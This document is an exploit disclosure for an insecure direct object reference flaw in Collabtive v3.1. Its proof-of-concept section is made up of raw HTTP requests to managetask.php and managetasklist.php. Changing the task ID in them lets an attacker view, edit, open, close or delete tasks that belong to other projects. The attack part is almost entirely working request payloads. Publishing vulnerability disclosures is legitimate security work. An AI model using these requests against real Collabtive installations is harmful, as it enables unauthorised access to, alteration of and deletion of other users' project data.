# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view/update/close/open/delete task that belongs to other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managetask.php?action=showtask&tid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
POST /managetask.php?action=edit&tid=1(CHANGE HERE)&id=1 HTTP/1.1
...

title=task1&text=t1&start=21.12.2023&end=23.12.2023&tasklist=1&assigned%5B%5D=2
```

```
GET /managetask.php?action=open&tid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
GET /managetask.php?action=close&tid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
GET /managetasklist.php?action=del&tlid=1(CHANGE HERE)&id=1 HTTP/1.1
```